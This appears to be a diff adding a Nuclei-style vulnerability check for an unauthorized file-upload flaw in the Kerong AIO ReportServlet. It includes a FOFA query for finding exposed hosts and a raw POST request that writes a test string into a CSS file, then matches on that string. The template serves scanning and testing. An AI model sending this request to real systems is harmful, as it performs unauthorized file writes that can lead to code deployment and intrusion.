@@ -1,0 +1,27 @@
+id: kerong-aio-reportservlet-file-upload
+info:
+  name: "科荣AIO ReportServlet 文件上传未授权写入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "changeAccount('8000')"
+      该系统在处理文件上传请求时未实施有效的访问控制机制，攻击者可通过构造特定请求实现非授权文件写入操作。此缺陷可能被利用部署恶意代码或执行远程命令，建议立即核查目标环境的文件上传校验逻辑。
+  tags: 科荣AIO
+http:
+- raw:
+  - |
+    POST /ReportServlet?operation=saveFormatFile&fileName=NTest.css&language= HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    NdayTest
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
